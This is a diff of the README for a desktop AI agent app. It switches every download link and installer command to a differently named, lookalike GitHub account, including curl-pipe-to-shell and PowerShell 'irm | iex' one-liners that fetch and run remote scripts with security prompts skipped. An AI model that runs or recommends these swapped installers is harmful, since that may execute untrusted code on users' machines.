@@ -8,7 +8,7 @@
 <p align="center"><strong>One desktop agent for code, documents, spreadsheets, decks and research, on any model.</strong></p>
 
 <p align="center">
-  <a href="https://github.com/hamzaaziada/meshpool-harness/releases"><img alt="Version 0.0.1 beta" src="https://img.shields.io/badge/version-0.0.1%20beta-1670E8"></a>
+  <a href="https://github.com/hamzaziada4422/meshpool-harness/releases"><img alt="Version 0.0.1 beta" src="https://img.shields.io/badge/version-0.0.1%20beta-1670E8"></a>
   <img alt="Mac and Windows app" src="https://img.shields.io/badge/app-Mac%20%7C%20Windows-16181D">
   <img alt="Command line on macOS, Linux and Windows" src="https://img.shields.io/badge/CLI-macOS%20%7C%20Linux%20%7C%20Windows-16181D">
 </p>
@@ -52,16 +52,16 @@ Each agent ran on the same model (DeepSeek V4.1 Flash), on the same tasks with t
 
 | Computer | Download |
 |---|---|
-| Mac with Apple silicon | [Meshpool.dmg](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool.dmg) |
-| Mac with Intel | [Meshpool-Intel.dmg](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool-Intel.dmg) |
-| Windows 10 or 11 | [Meshpool-Setup.exe](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool-Setup.exe) |
+| Mac with Apple silicon | [Meshpool.dmg](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool.dmg) |
+| Mac with Intel | [Meshpool-Intel.dmg](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool-Intel.dmg) |
+| Windows 10 or 11 | [Meshpool-Setup.exe](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool-Setup.exe) |
 
-**Setup guide** ([full guide](https://github.com/hamzaaziada/meshpool-harness/blob/main/docs/SETUP.md))
+**Setup guide** ([full guide](https://github.com/hamzaziada4422/meshpool-harness/blob/main/docs/SETUP.md))
 
 *Mac, quickest:* open Terminal, paste this and press Return. It installs Meshpool and opens it with no security prompts:
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/hamzaaziada/meshpool-harness/main/install.sh | bash -s -- --app
+curl -fsSL https://raw.githubusercontent.com/hamzaziada4422/meshpool-harness/main/install.sh | bash -s -- --app
 ```
 
 *Mac, from the download:*
@@ -90,11 +90,11 @@ Apple silicon Macs need macOS 11 or later; Intel Macs macOS 10.15 Catalina or la
 **Command line** (macOS, Linux, Windows). One command installs it and runs setup; then type `meshpool` in any project folder, or `meshpool ui` for the full app in your browser.
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/hamzaaziada/meshpool-harness/main/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/hamzaziada4422/meshpool-harness/main/install.sh | sh
 ```
 
 ```powershell
-irm https://raw.githubusercontent.com/hamzaaziada/meshpool-harness/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/hamzaziada4422/meshpool-harness/main/install.ps1 | iex
 ```
 
 ## What it does
